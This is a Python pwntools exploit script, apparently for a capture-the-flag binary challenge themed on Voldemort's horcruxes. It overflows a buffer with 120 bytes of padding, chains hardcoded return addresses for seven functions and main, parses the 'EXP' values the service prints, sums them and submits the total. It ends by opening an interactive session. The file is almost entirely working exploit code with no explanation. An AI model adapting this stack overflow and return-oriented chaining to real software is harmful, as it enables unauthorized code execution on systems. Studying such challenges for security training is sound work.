from pwn import *
a= conn = remote ('0',9032)
print(a)
a=conn.recvline()#'Voldemort concealed his splitted soul inside 7 horcruxes.\n'
print(a)
a=conn.recvline()#'Find all horcruxes, and destroy it!\n'
print(a)
a=conn.recvline()#"'\n'
print(a)
a=conn.recvuntil(':', drop=False)#
print(a)
conn.send('1\n')
a = conn.recvuntil(': ', drop=False)#
print(a)
#A_add = int('0x0809fe4b'[2:],16).to_bytes(4,byteorder='little')

A_add = '\x4b\xfe\x09\x08'
B_add = '\x6a\xfe\x09\x08'
C_add = '\x89\xfe\x09\x08'
D_add = '\xa8\xfe\x09\x08'
E_add = '\xc7\xfe\x09\x08'
F_add = '\xe6\xfe\x09\x08'
G_add = '\x05\xff\x09\x08'

add = '\x0b\x01\x0a\x08'
ropme_add = '\x09\x00\x0a\x08' 
main_add = '\xfc\xff\x09\x08'
payload = (120*'a'+A_add + B_add + C_add + D_add + E_add + F_add + G_add)
payload = payload +main_add

print(payload)
conn.write(payload)
conn.send('\n')
a = conn.recvline()#You'd better get more experience to kill Voldemort

sum = 0
for idx in range(7):
    print("idx = "+str(idx))
    a = conn.recvline()
    print(a)
    exp = re.match(r".*EXP \+(-?[0-9]+).*",a).group(1)
    exp = int(exp)
    print(exp)
    sum +=exp
#print(conn.recvline())
print("sum: "+str(sum))
conn.write(str(sum))

conn.interactive()

